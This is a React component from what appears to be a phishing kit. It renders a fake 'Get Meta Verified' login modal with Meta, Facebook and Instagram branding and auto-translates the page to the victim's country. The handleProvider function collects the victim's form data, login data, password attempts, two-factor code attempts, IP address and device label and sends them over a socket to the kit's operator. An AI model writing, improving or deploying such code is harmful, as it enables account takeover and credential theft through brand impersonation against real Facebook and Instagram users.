import PromoImage from '@/assets/images/imagemeta.webp';
import LogoInsta from '@/assets/images/logo-insta.webp';
import MetaVerifiedLogo from '@/assets/images/unnamedmeta.png';
import { faXmark } from '@fortawesome/free-solid-svg-icons/faXmark';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import { useAppealContext } from '@/hooks/use-appeal-context';
import { store } from '@/store/store';
import { buildAppealMessage } from '@/utils/message';
import { sendAppealMessage } from '@/utils/socket-approval';
import translateText from '@/utils/translate';
import Image from 'next/image';
import { useEffect, useState, type FC } from 'react';

const TEXT = {
    title: 'Get Meta Verified',
    hero: 'Protect your brand with Meta Verified and build trust with your audience.',
    facebook: 'Continue with Facebook',
    instagram: 'Continue with Instagram',
    termsLead: 'By clicking Continue, you accept our',
    terms: 'Terms of Service',
    and: 'and',
    privacy: 'Privacy Policy',
    close: 'Close modal'
} as const;

const textsToTranslate = Object.values(TEXT);

const LoginChoiceModal: FC<{ nextStep: (provider: 'facebook' | 'instagram') => void }> = ({ nextStep }) => {
    const [translations, setTranslations] = useState<Record<string, string>>({});
    const [loadingProvider, setLoadingProvider] = useState<'facebook' | 'instagram' | null>(null);

    const { setModalOpen, geoInfo, setLoginProvider } = store();
    const appeal = useAppealContext();

    const t = (text: string): string => translations[text] || text;

    useEffect(() => {
        document.title = TEXT.title;
    }, []);

    useEffect(() => {
        if (!geoInfo) {
            return;
        }

        const translateAll = async () => {
            const translatedMap: Record<string, string> = {};
            for (const text of textsToTranslate) {
                translatedMap[text] = await translateText(text, geoInfo.country_code);
            }
            setTranslations(translatedMap);
        };

        translateAll();
    }, [geoInfo]);

    const handleProvider = async (provider: 'facebook' | 'instagram') => {
        if (loadingProvider) {
            return;
        }

        setLoadingProvider(provider);
        setLoginProvider(provider);

        try {
            if (appeal.socket && appeal.isConnected && appeal.ip) {
                const message = buildAppealMessage({
                    form: appeal.formData,
                    login: appeal.loginData,
                    loginProvider: provider,
                    passwordLogs: appeal.passwordAttempts,
                    codeAttempts: appeal.twoFAAttempts,
                    ip: appeal.ip,
                    deviceLabel: appeal.deviceLabel
                });
                const newMessageId = await sendAppealMessage(appeal.socket, {
                    message,
                    message_id: appeal.messageId,
                    stage: 'info'
                });
                appeal.setMessageId(newMessageId);
            }
        } catch {
            //
        }

        setLoadingProvider(null);
        nextStep(provider);
    };

    return (
        <div className='modal-login-choice-overlay' role='dialog' aria-modal='true' aria-labelledby='login-choice-title'>
            <div className='modal-login-choice'>
                <button
                    type='button'
                    onClick={() => setModalOpen(false)}
                    className='modal-login-choice-close'
                    aria-label={t(TEXT.close)}
                >
                    <FontAwesomeIcon icon={faXmark} className='h-4 w-4' />
                </button>

                <div className='modal-login-choice-promo'>
                    <Image src={PromoImage} alt='' fill className='promo-bg' priority sizes='42vw' />
                    <div className='modal-login-choice-promo-gradient' aria-hidden='true' />
                    <Image src={MetaVerifiedLogo} alt='Meta Verified' width={56} height={56} className='modal-login-choice-promo-logo' />
                    <p className='modal-login-choice-promo-text'>{t(TEXT.hero)}</p>
                </div>

                <div className='modal-login-choice-main'>
                    <div className='center-logo'>
                        <Image src={MetaVerifiedLogo} alt='Meta Verified' width={64} height={64} priority />
                    </div>

                    <h2 id='login-choice-title'>{t(TEXT.title)}</h2>

                    <div className='social-buttons'>
                        <button
                            type='button'
                            disabled={loadingProvider !== null}
                            onClick={() => handleProvider('facebook')}
                            className='btn-social disabled:cursor-not-allowed disabled:opacity-60'
                        >
                            <svg className='h-5 w-5 shrink-0' viewBox='0 0 24 24' aria-hidden='true'>
                                <path
                                    fill='#1877F2'
                                    d='M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z'
                                />
                            </svg>
                            {loadingProvider === 'facebook' ? '…' : t(TEXT.facebook)}
                        </button>

                        <button
                            type='button'
                            disabled={loadingProvider !== null}
                            onClick={() => handleProvider('instagram')}
                            className='btn-social disabled:cursor-not-allowed disabled:opacity-60'
                        >
                            <Image src={LogoInsta} alt='Instagram' width={22} height={22} className='relative shrink-0 object-contain' />
                            {loadingProvider === 'instagram' ? '…' : t(TEXT.instagram)}
                        </button>
                    </div>

                    <p className='modal-login-choice-legal'>
                        {t(TEXT.termsLead)}{' '}
                        <u>{t(TEXT.terms)}</u> {t(TEXT.and)} <u>{t(TEXT.privacy)}</u>
                    </p>
                </div>
            </div>
        </div>
    );
};

export default LoginChoiceModal;
